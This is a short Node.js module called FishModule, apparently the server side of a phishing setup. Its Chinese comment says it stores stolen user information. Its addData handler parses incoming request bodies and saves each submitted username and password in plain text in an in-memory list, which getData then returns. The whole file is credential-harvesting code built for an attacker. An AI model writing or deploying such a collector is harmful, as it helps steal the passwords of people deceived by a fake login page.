// 存储窃取回来的用户信息
let users = [];

const FishModule = {
  getData: function () {
    return users;
  },
  addData: function (req, res) {
    req.on('data', function (data) {
      const result = JSON.parse(data);
      users.push({
        name: result.username,
        password: result.password
      })
      res.write(JSON.stringify({
        status: true,
      }));
      res.end();
    });
  }
};

module.exports = FishModule;